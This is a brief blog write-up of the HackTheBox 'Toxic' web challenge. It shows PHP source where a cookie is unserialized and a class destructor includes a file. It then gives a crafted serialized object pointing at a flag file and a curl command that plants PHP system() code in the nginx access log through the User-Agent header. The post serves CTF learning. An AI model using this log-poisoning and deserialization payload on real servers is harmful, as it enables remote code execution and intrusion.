---
layout: post
title:  "Toxic Challenge HTB"
date:   2021-11-14 23:31:48 +0200
categories: HTB Challenge Web
---
Today I decided to do a very cool Web challenge from HackTheBox which included `LFI`, which exploited correctly would give us partial `RCE` in the server. My Target IP+Port was 
`http://178.62.96.143:30264/`
 
So looking at the website it seemed pretty basic and the links didnt lead anywhere. So I had to see the source code for myself.
There were quite some interesting lined we could definitly exploit like this:
{% highlight php linenos%}
<?php
spl_autoload_register(function ($name){
    if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID', 
        base64_encode(serialize($page)), 
        time()+60*60*24, 
        '/'
    );
} 
$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);
{% endhighlight %}

So in Line 24 there is a dangerous function being called, and having access over it opens door to numerous exploits we can use. The exploit we are hinted is Log Poisoning hence the name of the challenge Toxin. In the docker file we are provided we can see that the `flag` name is genrated randomly and the path where logs are saved is `/var/log/nginx/acccess.log`. 
Having a look at the cookies we can see that we indeed have a `PHPSESSID` like shown in the code above
[![](/images/Toxin/Cookies.png)](/images/Toxin/Cookies.png)

so base64 decoding this gived us a serialised of bject of the class `PageModel`:
{% highlight php %}
<?php
class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}
{% endhighlight %}
the cookie
`PHPSESSID: Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9` 

decode gives us :
`O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}`

![Flag](/images/Toxin/Flag.png)

O:9:"PageModel":1:{s:4:"file";s:11:"/flag_juePd";}

{% highlight bash %}
curl --user-agent "<?php system('ls /') ?>" http://178.62.96.143:30264/
{% endhighlight %}
